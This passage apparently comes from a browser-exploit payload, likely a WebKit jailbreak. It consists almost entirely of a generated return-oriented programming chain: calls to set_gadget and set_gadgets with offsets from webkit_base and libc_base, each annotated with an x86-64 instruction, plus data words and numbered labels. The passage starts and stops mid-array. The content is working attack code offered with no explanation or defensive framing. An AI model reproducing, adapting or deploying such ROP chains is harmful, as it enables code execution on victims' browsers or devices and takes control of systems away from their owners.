webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+109128, //L1136
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1134:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1136:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+109272, //L1139
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+109240, //L1137
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+109256, //L1138
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1137:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1138:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1139:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+109344, //L1140
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1140:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+109400, //L1143
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1143:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+109480, //L1144
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1144:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1145:
db([22, 0]); // 0x16
set_gadget(libc_base+792472,); //pop rcx
//L1146:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+109584, //L1147
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+109600, //L1148
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1147:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1148:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+109688, //L1149
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1149:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+109744, //L1152
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1152:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+109816, //L1153
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1153:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+109872, //L1156
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1156:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1157:
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+110024, //L1160
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1159:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1160:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+110112, //L1161
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+110128, //L1163
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1161:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1163:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+110272, //L1166
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+110240, //L1164
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+110256, //L1165
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1164:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1165:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1166:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+110344, //L1167
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1167:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+110400, //L1170
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1170:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+110480, //L1171
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1171:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1172:
db([23, 0]); // 0x17
set_gadget(libc_base+792472,); //pop rcx
//L1173:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+110584, //L1174
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+110600, //L1175
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1174:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1175:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+110688, //L1176
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1176:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+110744, //L1179
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1179:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+110816, //L1180
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1180:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+110872, //L1183
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1183:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1184:
libc_base+206806, //pop rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+111024, //L1187
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1186:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1187:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+111112, //L1188
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+111128, //L1190
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1188:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1190:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+111272, //L1193
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+111240, //L1191
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+111256, //L1192
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1191:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1192:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1193:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+111344, //L1194
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1194:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+111400, //L1197
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1197:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+111480, //L1198
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1198:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1199:
db([24, 0]); // 0x18
set_gadget(libc_base+792472,); //pop rcx
//L1200:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+111584, //L1201
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+111600, //L1202
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1201:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1202:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+111688, //L1203
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1203:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+111744, //L1206
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1206:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+111816, //L1207
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1207:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+111872, //L1210
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1210:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+111976, //L1213
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1212:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+792472,); //pop rcx
//L1213:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+112064, //L1214
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+112080, //L1216
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1214:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1216:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+112224, //L1219
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+112192, //L1217
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+112208, //L1218
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1217:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1218:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1219:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+112296, //L1220
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1220:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+112352, //L1223
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1223:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+112432, //L1224
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1224:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1225:
db([4, 0]); // 0x4
set_gadget(libc_base+792472,); //pop rcx
//L1226:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+112536, //L1227
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+112552, //L1228
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1227:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1228:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+112640, //L1229
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1229:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+112696, //L1232
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1232:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+112816, //L1235
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1234:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1235:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+112904, //L1236
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+112920, //L1238
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1236:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1238:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+113064, //L1241
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+113032, //L1239
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+113048, //L1240
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1239:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1240:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1241:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+113136, //L1242
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1242:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+113192, //L1245
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1245:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+113272, //L1246
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1246:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1247:
db([25, 0]); // 0x19
set_gadget(libc_base+792472,); //pop rcx
//L1248:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+113376, //L1249
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+113392, //L1250
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1249:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1250:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+113480, //L1251
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1251:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+113536, //L1254
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1254:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+113608, //L1255
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1255:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+113664, //L1258
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1258:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1259:
webkit_base+8975893, //mov [rdi + 0x10], r8
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+113816, //L1262
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1261:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1262:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+113904, //L1263
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+113920, //L1265
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1263:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1265:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+114064, //L1268
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+114032, //L1266
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+114048, //L1267
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1266:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1267:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1268:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+114136, //L1269
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1269:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+114192, //L1272
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1272:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+114272, //L1273
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1273:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1274:
db([26, 0]); // 0x1a
set_gadget(libc_base+792472,); //pop rcx
//L1275:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+114376, //L1276
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+114392, //L1277
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1276:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1277:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+114480, //L1278
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1278:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+114536, //L1281
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1281:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+114608, //L1282
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1282:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+114664, //L1285
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1285:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1286:
libc_base+206806, //pop rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+114816, //L1289
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L1288:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1289:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+114904, //L1290
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+114920, //L1292
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1290:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1292:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+115064, //L1295
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+115032, //L1293
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+115048, //L1294
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1293:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1294:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1295:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+115136, //L1296
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1296:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+115192, //L1299
